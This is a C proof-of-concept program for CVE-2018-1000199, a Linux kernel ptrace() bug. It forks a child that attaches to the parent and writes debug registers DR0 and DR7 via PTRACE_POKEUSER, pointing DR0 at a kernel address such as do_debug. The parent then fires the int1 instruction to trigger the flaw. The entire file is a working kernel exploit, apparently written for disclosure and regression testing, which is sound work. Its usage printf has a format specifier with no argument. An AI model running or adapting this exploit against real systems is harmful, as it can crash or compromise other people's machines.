/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright (c) 2018 Andrew Lutomirski
 * PoC for a ptrace() bug.  Pass the address of do_debug to this program.
 * CVE-2018-1000199
 */
#define _GNU_SOURCE

#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <err.h>
#include <string.h>
#include <setjmp.h>

static void set_dr0_dr7(unsigned long dr0, unsigned long dr7)
{
	pid_t parent = getpid();
	int status;

	pid_t child = fork();
	if (child < 0)
		err(1, "fork");

	if (child) {
		if (waitpid(child, &status, 0) != child)
			err(1, "waitpid for child");
	} else {
		if (ptrace(PTRACE_ATTACH, parent, NULL, NULL) != 0)
			err(1, "PTRACE_ATTACH");

		if (waitpid(parent, &status, 0) != parent)
			err(1, "waitpid for child");

		printf("Will set DR0=%lx, DR7=%lx\n", dr0, dr7);

		if (ptrace(PTRACE_POKEUSER, parent, (void *)offsetof(struct user, u_debugreg[0]), dr0) != 0)
			err(1, "PTRACE_POKEUSER DR0 = %lx", dr0);

		if (ptrace(PTRACE_POKEUSER, parent, (void *)offsetof(struct user, u_debugreg[7]), dr7) != 0)
			err(1, "PTRACE_POKEUSER DR7 = %lx", dr7);

		if (ptrace(PTRACE_DETACH, parent, NULL, NULL) != 0)
			err(1, "PTRACE_DETACH");

		exit(0);
	}
}

int main(int argc, char **argv)
{
	unsigned long danger_dr0;
	if (argc == 2) {
		char *end;
		danger_dr0 = strtoull(argv[1], &end, 16);
	} else {
		printf("Usage: %s DR0\n\nSet DR0 to a problematic address\n");
		danger_dr0 = 0x8000000000000000;
	}

	set_dr0_dr7(1, 1);
	set_dr0_dr7(danger_dr0, 0);

	asm volatile (".byte 0xf1");
	return 0;
}
